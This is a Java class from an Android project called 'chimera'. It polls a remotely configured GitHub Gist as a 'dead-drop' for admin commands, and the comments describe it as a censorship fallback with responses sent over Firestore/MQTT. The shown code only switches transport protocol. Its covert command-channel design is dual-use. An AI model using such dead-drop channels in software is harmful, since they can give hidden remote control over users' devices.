package com.chimera;

import android.content.Context;
import android.content.SharedPreferences;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

/**
 * GitHub Gist dead-drop: raw.githubusercontent.com (free, no domain owned)
 * Admin updates Gist, device polls ETag. Extreme censorship fallback.
 * URL stored in SharedPreferences via RemoteConfig/Firestore, default empty = disabled.
 */
public class GistTransport implements Transport {
    private Thread pollThread;
    private volatile boolean running = false;

    @Override public String name() { return "gist"; }

    @Override public boolean isHealthy(Context ctx) {
        SharedPreferences p = ctx.getSharedPreferences("chimera_prefs", Context.MODE_PRIVATE);
        String url = p.getString("gist_url", "");
        return !url.isEmpty() && NetworkStateMonitor.canAttemptHeartbeat(ctx);
    }

    @Override public void start(Context ctx) {
        if (running) return;
        if (!isHealthy(ctx)) return;
        running = true;
        pollThread = new Thread(() -> {
            String lastEtag = "";
            while (running && !Thread.currentThread().isInterrupted()) {
                try {
                    SharedPreferences p = ctx.getSharedPreferences("chimera_prefs", Context.MODE_PRIVATE);
                    String urlStr = p.getString("gist_url", "");
                    if (urlStr.isEmpty()) { Thread.sleep(120000); continue; }
                    if (!NetworkStateMonitor.canAttemptHeartbeat(ctx)) { Thread.sleep(120000); continue; }
                    HttpURLConnection conn = (HttpURLConnection) new URL(urlStr).openConnection();
                    conn.setConnectTimeout(15000);
                    conn.setReadTimeout(15000);
                    if (!lastEtag.isEmpty()) conn.setRequestProperty("If-None-Match", lastEtag);
                    int code = conn.getResponseCode();
                    if (code == 304) { Thread.sleep(120000); continue; }
                    if (code == 200) {
                        lastEtag = conn.getHeaderField("ETag") != null ? conn.getHeaderField("ETag") : "";
                        BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                        StringBuilder sb = new StringBuilder();
                        String line;
                        while ((line = br.readLine()) != null) sb.append(line);
                        String body = sb.toString();
                        if (body.contains("switch_client")) TransportManager.switchToClientProtocol(ctx);
                    }
                    Thread.sleep(120000);
                } catch (InterruptedException ie) { Thread.currentThread().interrupt(); break; }
                catch (Exception e) { ErrorLogger.logError(ctx, "Gist_poll", e); try{Thread.sleep(120000);}catch(Exception ignored){} }
            }
        });
        pollThread.start();
    }

    @Override public void send(String message, Context ctx) {
        // Gist is read-only dead-drop for commands, responses go via Firestore/MQTT
    }

    @Override public void stop() { running=false; if(pollThread!=null) pollThread.interrupt(); }
}
